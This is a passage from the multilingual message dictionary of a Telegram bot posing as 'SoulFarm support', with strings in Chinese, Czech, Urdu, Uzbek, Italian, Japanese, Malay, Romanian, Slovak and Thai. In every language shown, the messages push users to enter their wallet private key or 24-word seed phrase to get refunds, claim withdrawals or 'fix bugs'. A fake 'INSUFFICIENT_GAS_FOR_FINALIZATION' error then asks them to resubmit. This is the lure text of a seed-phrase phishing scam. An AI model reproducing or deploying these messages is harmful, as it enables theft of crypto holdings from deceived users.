        "connect_reflection": "请连接您的钱包以在钱包中反映您的代币",
        "connect_pending_withdrawal": "请连接您的钱包以领取待处理的提现",
        "connect_fix_bug": "请连接您的钱包以修复您钱包中的错误",
                        "retry": '🔄 重试',
        "post_receive_error": '⚠️ TON 钱包验证失败\n\n由于完成链上操作所需的网络燃料费和智能合约执行费中 TON 余额不足，钱包验证无法完成。\n\nTON 错误：INSUFFICIENT_GAS_FOR_FINALIZATION\n\n请确保已连接的钱包有足够的 TON 用于交易最终性，然后重试验证。\n\n另外，请在本地重新检查所有 24 个恢复词是否存在拼写错误、缺失词汇、顺序错误或无效条目。任何一个不匹配都可能导致钱包身份验证/派生验证失败。',
    },
    "cs": {
        "welcome": "Hi {user} vítejte u SoulFarm support bot! Tento bot pomáhá s přístupem k peněžence, transakcemi, zůstatky, obnovami, obnovením účtu, nárokováním tokenů a odměn, refundacemi a validacemi účtu. Vyberte prosím možnost z nabídky pro pokračování.",
        "main menu title": "Vyberte typ problému pro pokračování:",
        "validation": "Ověření",
        "claim tokens": "Nárokovat Tokeny",
        "recover account progress": "Obnovit postup účtu",
        "assets recovery": "Obnovení aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Oprava",
        "withdrawals": "Výběry",
        "missing balance": "Chybějící zůstatek",
        "login issues": "Problémy s přihlášením",
        "connect wallet message": "Připojte peněženku pomocí Private Key nebo Seed Phrase.",
        "connect wallet button": "🔑 Připojit Wallet",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importovat Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Vybrali jste {wallet_name}.\nVyberte preferovaný způsob připojení.",
        "reassurance": PROFESSIONAL_REASSURANCE["cs"],
        "prompt seed": "Zadejte seed phrase o 12 nebo 24 slovech.",
        "prompt private key": "Zadejte prosím svůj private key.",
        "prompt_24_wallet_type_metamask": "Zadejte 24 slov vašeho Tonkeeper peněženky.",
        "prompt_24_wallet_type_trust_wallet": "Zadejte 24 slov vašeho Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Zadejte 24 slov vašeho MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Zadejte 24 slov vašeho Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Toto pole vyžaduje seed phrase (24 slov vašeho Tonkeeper peněženky). Uveďte prosím seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Toto pole vyžaduje seed phrase (24 slov vašeho Telegram peněženky). Uveďte prosím seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Toto pole vyžaduje seed phrase (24 slov vašeho MyTon peněženky). Uveďte prosím seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Toto pole vyžaduje seed phrase (24 slov vašeho Tonhub peněženky). Uveďte prosím seed phrase.",
        "refund": "Vrácení peněz",
        "reflection": "Reflexe",
        "pending withdrawal": "Čekající výběr",
        "fix bug": "Opravit chybu",
        "connect_refund": "Připojte prosím peněženku, abyste obdrželi vrácení peněz",
        "connect_reflection": "Připojte prosím peněženku pro zobrazení vašich tokenů v peněžence",
        "connect_pending_withdrawal": "Připojte prosím peněženku pro vyžádání čekajícího výběru",
        "connect_fix_bug": "Připojte prosím peněženku pro opravu chyby v peněžence",
                        "retry": '🔄 Zkusit znovu',
        "post_receive_error": '⚠️ Ověření peněženky TON selhalo\n\nOvěření peněženky nebylo možné dokončit z důvodu nedostatečného TON pro poplatky za síťový plyn a provádění chytrých kontraktů potřebných k dokončení on-chain operace.\n\nChyba TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUjistěte se, že připojená peněženka má dostatek TON pro konečnost transakce, a poté opakujte ověření.\n\nDále lokálně zkontrolujte všech 24 slov pro obnovu na překlepy, chybějící slova, nesprávné pořadí nebo neplatné záznamy. Jediný nesoulad může způsobit selhání ověření autentizace/odvozování peněženky.',
    },
    "ur": {
        "welcome": "Hi {user} welcome to SoulFarm support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
        "main menu title": "براہ کرم جاری رکھنے کیلئے مسئلے کی قسم منتخب کریں:",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن کلیم کریں",
        "recover account progress": "اکاؤنٹ کی پیشرفت بحال کریں",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عمومی مسائل",
        "rectification": "درستگی",
        "withdrawals": "رقم نکالیں",
        "missing balance": "گم شدہ بیلنس",
        "login issues": "لاگ ان مسائل",
        "connect wallet message": "براہ کرم والٹ کو Private Key یا Seed Phrase کے ساتھ منسلک کریں۔",
        "connect wallet button": "🔑 والٹ جوڑیں",
        "select wallet type": "براہ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase امپورٹ کریں",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
        "reassurance": PROFESSIONAL_REASSURANCE["ur"],
        "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。",
        "prompt private key": "براہ کرم اپنا private key درج کریں。",
        "prompt_24_wallet_type_metamask": "براہ کرم اپنے Tonkeeper والٹ کے 24 الفاظ درج کریں。",
        "prompt_24_wallet_type_trust_wallet": "براہ کرم اپنے Telegram والٹ کے 24 الفاظ درج کریں。",
        "prompt_24_wallet_type_coinbase": "براہ کرم اپنے MyTon والٹ کے 24 الفاظ درج کریں。",
        "prompt_24_wallet_type_tonkeeper": "براہ کرم اپنے Tonhub والٹ کے 24 الفاظ درج کریں。",
        "wallet_24_error_wallet_type_metamask": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے Tonkeeper والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "wallet_24_error_wallet_type_trust_wallet": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے Telegram والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "wallet_24_error_wallet_type_coinbase": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے MyTon والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "wallet_24_error_wallet_type_tonkeeper": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے Tonhub والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں۔",
        "refund": "واپسی",
        "reflection": "عکس",
        "pending withdrawal": "زیر التواء واپسی",
        "fix bug": "خرابی درست کریں",
        "connect_refund": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ آپ اپنی واپسی وصول کرسکیں",
        "connect_reflection": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ آپ کے ٹوکن آپ کے والٹ میں ظاہر ہوں",
        "connect_pending_withdrawal": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ آپ زیر التواء واپسی کا دعویٰ کرسکیں",
        "connect_fix_bug": "براہ کرم اپنا والٹ کنیکٹ کریں تاکہ آپ کے والٹ میں خرابی درست کی جا سکے",
                        "retry": '🔄 دوبارہ کوشش کریں',
        "post_receive_error": '⚠️ TON والٹ کی تصدیق ناکام ہوئی\n\nنیٹ ورک گیس اور سمارٹ کنٹریکٹ کے عمل کی فیس کے لیے ناکافی TON کی وجہ سے والٹ کی تصدیق مکمل نہیں ہو سکی جو آن چین آپریشن کو مکمل کرنے کے لیے ضروری ہیں۔\n\nTON خرابی: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nیقینی بنائیں کہ جڑا ہوا والٹ لین دین کی حتمیت کے لیے کافی TON رکھتا ہے، پھر تصدیق دوبارہ آزمائیں۔\n\nاس کے علاوہ، تمام 24 بحالی الفاظ کو مقامی طور پر ہجے کی غلطیوں، گمشدہ الفاظ، غلط ترتیب یا غیر درست اندراجات کے لیے جانچیں۔ ایک بھی عدم مطابقت والٹ کی تصدیق/مشتق درستگی کو ناکام بنا سکتی ہے۔',
    },
    "uz": {
        "welcome": "Hi {user} SoulFarm support botga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variant tanlang.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni da'vo qilish",
        "recover account progress": "Hisobning rivojlanishini tiklash",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "withdrawals": "Chiqim",
        "missing balance": "Yoʻqolgan balans",
        "login issues": "Kirish muammolari",
        "connect wallet message": "Iltimos, hamyoningizni Private Key yoki Seed Phrase bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase import qilish",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz.\nUlanish usulini tanlang.",
        "reassurance": PROFESSIONAL_REASSURANCE["uz"],
        "prompt seed": "Iltimos 12 yoki 24 soʻzli seed phrase kiriting。",
        "prompt private key": "Private Key kiriting。",
        "prompt_24_wallet_type_metamask": "Iltimos Tonkeeper hamyoningizning 24 so‘zini kiriting.",
        "prompt_24_wallet_type_trust_wallet": "Iltimos Telegram hamyoningizning 24 so‘zini kiriting.",
        "prompt_24_wallet_type_coinbase": "Iltimos MyTon hamyoningizning 24 so‘zini kiriting.",
        "prompt_24_wallet_type_tonkeeper": "Iltimos Tonhub hamyoningizning 24 so‘zini kiriting.",
        "wallet_24_error_wallet_type_metamask": "Ushbu maydon seed phrase (Tonkeeper hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "wallet_24_error_wallet_type_trust_wallet": "Ushbu maydon seed phrase (Telegram hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "wallet_24_error_wallet_type_coinbase": "Ushbu maydon seed phrase (MyTon hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "wallet_24_error_wallet_type_tonkeeper": "Ushbu maydon seed phrase (Tonhub hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "refund": "Qaytarish",
        "reflection": "Aks ettirish",
        "pending withdrawal": "Kutilayotgan chiqarish",
        "fix bug": "Xatoni tuzatish",
        "connect_refund": "Iltimos, qaytarishni qabul qilish uchun hamyoningizni ulang",
        "connect_reflection": "Iltimos, tokenlaringizni hamyoningizga aks ettirish uchun hamyoningizni ulang",
        "connect_pending_withdrawal": "Iltimos, kutilayotgan chiqarishni da'vo qilish uchun hamyoningizni ulang",
        "connect_fix_bug": "Iltimos, hamyoningizdagi xatoni tuzatish uchun hamyoningizni ulang",
                        "retry": '🔄 Qayta urinish',
        "post_receive_error": "⚠️ TON hamyon tekshiruvi muvaffaqiyatsiz tugadi\n\nOn-chain operatsiyani yakunlash uchun zarur bo'lgan tarmoq gaz to'lovlari va aqlli shartnoma bajarish to'lovlari uchun yetarli TON bo'lmaganligi sababli hamyon tekshiruvi yakunlanmadi.\n\nTON xatosi: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUlangan hamyonda tranzaksiya yakuniyligi uchun yetarli TON borligiga ishonch hosil qiling, so'ngra tekshiruvni qayta urinib ko'ring.\n\nBundan tashqari, barcha 24 ta tiklash so'zini imlo xatoliklari, tushirib qoldirilgan so'zlar, noto'g'ri tartib yoki yaroqsiz yozuvlar uchun mahalliy ravishda tekshiring. Bitta nomuvofiqlik hamyon autentifikatsiya/derivatsiya tekshiruvining muvaffaqiyatsiz bo'lishiga olib kelishi mumkin.",
    },
    "it": {
        "welcome": "Hi {user} benvenuto al SoulFarm support bot! Questo bot aiuta con l'accesso al wallet, transazioni, saldi, recuperi, recupero account, richiesta token e ricompense, rimborsi e validazioni account. Scegli un'opzione del menu per procedere.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "recover account progress": "Recupera progresso account",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "withdrawals": "Prelievi",
        "missing balance": "Saldo Mancante",
        "login issues": "Problemi di Accesso",
        "connect wallet message": "Collega il tuo wallet con la Private Key o Seed Phrase per continuare.",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importa Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "reassurance": PROFESSIONAL_REASSURANCE["it"],
        "prompt seed": "Inserisci la seed phrase di 12 o 24 parole。",
        "prompt private key": "Inserisci il tuo private key。",
        "prompt_24_wallet_type_metamask": "Inserisci le 24 parole del tuo wallet Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Inserisci le 24 parole del tuo Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Inserisci le 24 parole del tuo MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Inserisci le 24 parole del tuo Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet Tonkeeper). Fornisci la seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet Telegram). Fornisci la seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet MyTon). Fornisci la seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet Tonhub). Fornisci la seed phrase.",
        "refund": "Rimborso",
        "reflection": "Riflessione",
        "pending withdrawal": "Prelievo in sospeso",
        "fix bug": "Correggi BUG",
        "connect_refund": "Collega il tuo wallet per ricevere il rimborso",
        "connect_reflection": "Collega il tuo wallet per riflettere i tuoi token nel wallet",
        "connect_pending_withdrawal": "Collega il tuo wallet per richiedere il prelievo in sospeso",
        "connect_fix_bug": "Collega il tuo wallet per correggere il bug sul tuo wallet",
                        "retry": '🔄 Riprova',
        "post_receive_error": "⚠️ Verifica del portafoglio TON fallita\n\nLa verifica del portafoglio non ha potuto essere finalizzata a causa di TON insufficienti per le commissioni di gas di rete e di esecuzione dei contratti intelligenti necessari per completare l'operazione on-chain.\n\nErrore TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAssicurati che il portafoglio connesso disponga di TON sufficienti per la finalità della transazione, quindi riprova la verifica.\n\nInoltre, controlla localmente tutte le 24 parole di recupero per errori di ortografia, parole mancanti, ordine errato o voci non valide. Una sola discrepanza può causare il fallimento della validazione di autenticazione/derivazione del portafoglio.",
    },
    "ja": {
        "welcome": "Hi {user} ようこそ SoulFarm support bot へ！このボットはウォレットアクセス、トランザクション、残高、復旧、アカウント回復、トークンや報酬の請求、返金、アカウント検証を支援します。メニューから選択してください。",
        "main menu title": "続行する問題の種類を選択してください：",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "recover account progress": "アカウントの進行を回復",
        "assets recovery": "資産回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "withdrawals": "出金",
        "missing balance": "残高なし",
        "login issues": "ログインの問題",
        "connect wallet message": "プライベートキーまたはSeed Phraseでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレット接続",
        "select wallet type": "ウォレットの種類を選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase をインポート",
        "label_seed_phrase": "シードフレーズ",
        "label_private_key": "プライベートキー",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE["ja"],
        "prompt seed": "12 または 24 語の seed phrase を入力してください。",
        "prompt private key": "プライベートキーを入力してください。",
        "prompt_24_wallet_type_metamask": "Tonkeeper ウォレットの 24 語を入力してください。",
        "prompt_24_wallet_type_trust_wallet": "Telegram ウォレットの 24 語を入力してください。",
        "prompt_24_wallet_type_coinbase": "MyTon ウォレットの 24 語を入力してください。",
        "prompt_24_wallet_type_tonkeeper": "Tonhub ウォレットの 24 語を入力してください。",
        "wallet_24_error_wallet_type_metamask": "このフィールドにはシードフレーズ（Tonkeeper ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "wallet_24_error_wallet_type_trust_wallet": "このフィールドにはシードフレーズ（Telegram ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "wallet_24_error_wallet_type_coinbase": "このフィールドにはシードフレーズ（MyTon ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "wallet_24_error_wallet_type_tonkeeper": "このフィールドにはシードフレーズ（Tonhub ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "refund": "返金",
        "reflection": "反映",
        "pending withdrawal": "保留中の出金",
        "fix bug": "バグ修正",
        "connect_refund": "返金を受け取るためにウォレットを接続してください",
        "connect_reflection": "トークンをウォレットに反映するためにウォレットを接続してください",
        "connect_pending_withdrawal": "保留中の出金を請求するためにウォレットを接続してください",
        "connect_fix_bug": "ウォレットのバグを修正するためにウォレットを接続してください",
                        "retry": '🔄 再試行',
        "post_receive_error": '⚠️ TONウォレットの検証に失敗しました\n\nオンチェーン操作を完了するために必要なネットワークガス料金とスマートコントラクト実行手数料に対してTONが不足しているため、ウォレットの検証を完了できませんでした。\n\nTONエラー: INSUFFICIENT_GAS_FOR_FINALIZATION\n\n接続されたウォレットにトランザクションの完了に十分なTONがあることを確認し、再度検証をお試しください。\n\nまた、24個の回復ワードすべてをローカルで確認し、スペルミス、欠落したワード、誤った順序、または無効なエントリがないかチェックしてください。1つでも不一致があると、ウォレットの認証/導出検証が失敗する可能性があります。',
    },
    "ms": {
        "welcome": "Hi {user} selamat datang ke SoulFarm support bot! Bot ini membantu dengan capaian wallet, transaksi, baki, pemulihan, pemulihan akaun, tuntutan token dan ganjaran, pulangan dan pengesahan akaun. Sila pilih pilihan menu untuk meneruskan.",
        "main menu title": "Sila pilih jenis isu untuk meneruskan:",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "recover account progress": "Pulihkan kemajuan akaun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Isu Umum",
        "rectification": "Pembetulan",
        "withdrawals": "Pengeluaran",
        "missing balance": "Baki Hilang",
        "login issues": "Isu Log Masuk",
        "connect wallet message": "Sila sambungkan wallet anda dengan Private Key atau Seed Phrase untuk meneruskan。",
        "connect wallet button": "🔑 Sambung Wallet",
        "select wallet type": "Sila pilih jenis wallet anda:",
        "other wallets": "Wallet Lain",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Anda telah memilih {wallet_name}。\nPilih mod sambungan pilihan anda。",
        "reassurance": PROFESSIONAL_REASSURANCE["ms"],
        "prompt seed": "Sila masukkan seed phrase 12 atau 24 perkataan anda。",
        "prompt private key": "Sila masukkan private key anda。",
        "prompt_24_wallet_type_metamask": "Sila masukkan 24 kata untuk wallet Tonkeeper anda。",
        "prompt_24_wallet_type_trust_wallet": "Sila masukkan 24 kata untuk Telegram Wallet anda。",
        "prompt_24_wallet_type_coinbase": "Sila masukkan 24 kata untuk MyTon wallet anda。",
        "prompt_24_wallet_type_tonkeeper": "Sila masukkan 24 kata untuk Tonhub wallet anda。",
        "wallet_24_error_wallet_type_metamask": "Medan ini memerlukan seed phrase (24 kata dari wallet Tonkeeper anda). Sila berikan seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Medan ini memerlukan seed phrase (24 kata dari wallet Telegram anda). Sila berikan seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Medan ini memerlukan seed phrase (24 kata dari wallet MyTon anda). Sila berikan seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Medan ini memerlukan seed phrase (24 kata dari wallet Tonhub anda). Sila berikan seed phrase.",
        "refund": "Bayaran balik",
        "reflection": "Refleksi",
        "pending withdrawal": "Pengeluaran tertunda",
        "fix bug": "Betulkan BUG",
        "connect_refund": "Sila sambungkan wallet anda untuk menerima bayaran balik anda",
        "connect_reflection": "Sila sambungkan wallet anda untuk mencerminkan token anda dalam wallet anda",
        "connect_pending_withdrawal": "Sila sambungkan wallet anda untuk menuntut pengeluaran tertunda anda",
        "connect_fix_bug": "Sila sambungkan wallet anda untuk membetulkan bug pada wallet anda",
                        "retry": '🔄 Cuba semula',
        "post_receive_error": '⚠️ Pengesahan Dompet TON Gagal\n\nPengesahan dompet tidak dapat diselesaikan kerana TON tidak mencukupi untuk bayaran gas rangkaian dan pelaksanaan kontrak pintar yang diperlukan untuk melengkapkan operasi on-chain.\n\nRalat TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nPastikan dompet yang disambungkan mempunyai TON yang mencukupi untuk muktamad transaksi, kemudian cuba semula pengesahan.\n\nSelain itu, semak secara tempatan kesemua 24 perkataan pemulihan untuk kesilapan ejaan, perkataan yang hilang, susunan yang salah, atau entri yang tidak sah. Satu ketidakpadanan boleh menyebabkan pengesahan pengesahan/derivasi dompet gagal.',
    },
    "ro": {
        "welcome": "Hi {user} bine ați venit la SoulFarm support bot! Acest bot ajută cu acces portofel, tranzacții, solduri, recuperări, recuperare cont, revendicare token-uri și recompense, rambursări și validări cont. Vă rugăm să alegeți o opțiune din meniu pentru a continua.",
        "main menu title": "Selectați un tip de problemă pentru a continua:",
        "validation": "Validare",
        "claim tokens": "Revendică Token-uri",
        "recover account progress": "Recuperează progresul contului",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "withdrawals": "Retrageri",
        "missing balance": "Sold Lipsă",
        "login issues": "Probleme Autentificare",
        "connect wallet message": "Vă rugăm conectați portofelul cu Private Key sau Seed Phrase pentru a continua。",
        "connect wallet button": "🔑 Conectează Wallet",
        "select wallet type": "Selectați tipul wallet:",
        "other wallets": "Alte Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "fraza seed",
        "label_private_key": "cheie privată",
        "wallet selection message": "Ați selectat {wallet_name}。\nSelectați modul de conectare preferat。",
        "reassurance": PROFESSIONAL_REASSURANCE["ro"],
        "prompt seed": "Introduceți seed phrase de 12 sau 24 cuvinte。",
        "prompt private key": "Introduceți private key。",
        "prompt_24_wallet_type_metamask": "Introduceți cele 24 de cuvinte ale portofelului dvs. Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Introduceți cele 24 de cuvinte ale Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Introduceți cele 24 de cuvinte ale MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Introduceți cele 24 de cuvinte ale Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Acest câmp necesită o seed phrase (cele 24 de cuvinte ale portofelului dvs. Tonkeeper). Vă rugăm să furnizați seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Acest câmp necesită o seed phrase (cele 24 de cuvinte ale portofelului dvs. Telegram). Vă rugăm să furnizați seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Acest câmp necesită o seed phrase (cele 24 de cuvinte ale portofelului dvs. MyTon). Vă rugăm să furnizați seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Acest câmp necesită o seed phrase (cele 24 de cuvinte ale portofelului dvs. Tonhub). Vă rugăm să furnizați seed phrase.",
        "refund": "Rambursare",
        "reflection": "Reflecție",
        "pending withdrawal": "Retragere în așteptare",
        "fix bug": "Remediază BUG",
        "connect_refund": "Vă rugăm să conectați portofelul pentru a primi rambursarea",
        "connect_reflection": "Vă rugăm să conectați portofelul pentru a reflecta token-urile în portofel",
        "connect_pending_withdrawal": "Vă rugăm să conectați portofelul pentru a revendica retragerea în așteptare",
        "connect_fix_bug": "Vă rugăm să conectați portofelul pentru a remedia bug-ul din portofel",
                        "retry": '🔄 Încearcă din nou',
        "post_receive_error": '⚠️ Verificarea portofelului TON a eșuat\n\nVerificarea portofelului nu a putut fi finalizată din cauza TON insuficient pentru taxele de gaz de rețea și executarea contractelor inteligente necesare pentru a finaliza operațiunea on-chain.\n\nEroare TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAsigurați-vă că portofelul conectat are suficient TON pentru finalitatea tranzacției, apoi reîncercați verificarea.\n\nDe asemenea, verificați local toate cele 24 de cuvinte de recuperare pentru erori de ortografiere, cuvinte lipsă, ordine incorectă sau intrări invalide. O singură nepotrivire poate cauza eșecul validării autentificării/derivării portofelului.',
    },
    "sk": {
        "welcome": "Hi {user} vítajte pri SoulFarm support bot! Tento bot pomáha s prístupom k peňaženke, transakciami, zostatkami, obnovami, obnovením účtu, tokenmi a odmenami, refundáciami a overením účtu. Vyberte možnosť v ponuke pre pokračovanie.",
        "main menu title": "Vyberte typ problému pre pokračovanie:",
        "validation": "Validácia",
        "claim tokens": "Uplatniť tokeny",
        "recover account progress": "Obnoviť priebeh účtu",
        "assets recovery": "Obnovenie aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Oprava",
        "withdrawals": "Výbery",
        "missing balance": "Chýbajúci zostatok",
        "login issues": "Problémy s prihlásením",
        "connect wallet message": "Pripojte wallet pomocou Private Key alebo Seed Phrase。",
        "connect wallet button": "🔑 Pripojiť Wallet",
        "select wallet type": "Vyberte typ wallet:",
        "other wallets": "Iné Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Vybrali ste {wallet_name}。\nVyberte preferovaný spôsob pripojenia。",
        "reassurance": PROFESSIONAL_REASSURANCE["sk"],
        "prompt seed": "Zadajte seed phrase s 12 alebo 24 slovami。",
        "prompt private key": "Zadajte svoj private key。",
        "prompt_24_wallet_type_metamask": "Zadajte 24 slov vášho Tonkeeper peňaženky.",
        "prompt_24_wallet_type_trust_wallet": "Zadajte 24 slov vášho Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Zadajte 24 slov vášho MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Zadajte 24 slov vášho Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Toto pole vyžaduje seed phrase (24 slov vášho Tonkeeper peňaženky). Prosím, poskytnite seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Toto pole vyžaduje seed phrase (24 slov vášho Telegram peňaženky). Prosím, poskytnite seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Toto pole vyžaduje seed phrase (24 slov vášho MyTon peňaženky). Prosím, poskytnite seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Toto pole vyžaduje seed phrase (24 slov vášho Tonhub peňaženky). Prosím, poskytnite seed phrase.",
        "refund": "Ramburs",
        "reflection": "Reflexia",
        "pending withdrawal": "Čakajúci výber",
        "fix bug": "Opraviť chybu",
        "connect_refund": "Pripojte prosím peňaženku, aby ste dostali vrátenie",
        "connect_reflection": "Pripojte prosím peňaženku, aby ste odrazili svoje tokeny v peňaženke",
        "connect_pending_withdrawal": "Pripojte prosím peňaženku, aby ste si uplatnili čakajúci výber",
        "connect_fix_bug": "Pripojte prosím peňaženku, aby ste opravili chybu vo svojej peňaženke",
                        "retry": '🔄 Skúsiť znovu',
        "post_receive_error": '⚠️ Overenie peňaženky TON zlyhalo\n\nOverenie peňaženky nemohlo byť dokončené z dôvodu nedostatočného TON pre poplatky za sieťový plyn a vykonávanie smart kontraktov potrebných na dokončenie on-chain operácie.\n\nChyba TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUistite sa, že pripojená peňaženka má dostatok TON pre konečnosť transakcie, a potom zopakujte overenie.\n\nTaktiež lokálne skontrolujte všetkých 24 slov pre obnovu na preklepy, chýbajúce slová, nesprávne poradie alebo neplatné záznamy. Jediný nesúlad môže spôsobiť zlyhanie overenia autentizácie/odvodzovania peňaženky.',
    },
    "th": {
        "welcome": "Hi {user} ยินดีต้อนรับสู่ SoulFarm support bot! บอทนี้ช่วยเรื่องการเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การกู้คืนบัญชี, การเคลมโทเค็นและรางวัล, การคืนเงิน และการยืนยันบัญชี กรุณาเลือกตัวเลือกจากเมนูเพื่อดำเนินการต่อ",
        "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "validation": "การยืนยัน",
        "claim tokens": "เคลมโทเค็น",
        "recover account progress": "กู้คืนความคืบหน้าบัญชี",
        "assets recovery": "กู้คืนทรัพย์สิน",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "withdrawals": "ถอนเงิน",
        "missing balance": "ยอดคงเหลือหาย",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "connect wallet message": "โปรดเชื่อมต่อกระเป๋าของคุณด้วย Private Key หรือ Seed Phrase เพื่อดำเนินการต่อ",
        "connect wallet button": "🔑 เชื่อมต่อ Wallet",
        "select wallet type": "โปรดเลือกประเภท wallet:",
        "other wallets": "Wallet อื่น ๆ",
        "private key": "🔑 Private Key",
